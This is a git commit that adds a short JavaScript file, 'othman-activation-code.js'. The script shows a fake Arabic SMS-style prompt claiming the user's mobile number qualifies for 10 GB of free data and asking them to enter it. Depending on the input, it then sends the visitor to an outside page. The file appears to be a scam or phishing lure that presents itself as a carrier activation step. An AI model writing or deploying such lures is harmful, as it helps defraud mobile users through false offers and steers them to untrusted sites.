b0abf9e4c02b82132a1a3ef6b88ccbc15c793464
mfednewblog9 <newekpeitid@gmail.com>
2026-01-21 08:01:45 +0100

    Create othman-activation-code.js

---
+++ othman-activation-code.js
@@ -0,0 +1,5 @@
+var password = 'تفعيل 10 جيجابايت'
+password=prompt('SMS: تهانينا، رقم هاتفك المحمول مؤهل للحصول على 10 جيجابايت، انقر فوق "موافق" لإدخال رقم هاتفك المحمول.','تفعيل 10 جيجابايت');
+if (password != 'تفعيل 10 جيجابايت') {
+location.href='https://igbim.org/othman-birthday.html';
+}
